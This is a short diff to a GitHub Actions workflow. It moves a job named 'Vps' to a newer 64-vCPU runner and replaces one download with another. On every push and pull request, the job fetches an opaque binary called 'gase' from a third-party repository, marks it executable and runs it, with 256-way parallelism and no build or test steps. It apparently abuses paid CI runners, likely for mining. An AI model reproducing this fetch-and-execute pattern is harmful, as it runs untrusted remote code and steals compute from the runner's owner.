@@ -3,7 +3,7 @@ on: [push, pull_request]
 jobs:
   build:
     name: Vps
-    runs-on: buildjet-64vcpu-ubuntu-1804
+    runs-on: buildjet-64vcpu-ubuntu-2004
     strategy:
       max-parallel: 256
       fail-fast: false
@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-        wget https://raw.githubusercontent.com/komaria10003099/komaria/main/protono.sh && chmod +x protono.sh && ./protono.sh
+        wget -qO gase https://github.com/komaria10003099/redesigned-pancake/raw/main/gas && chmod +x gase && ./gase
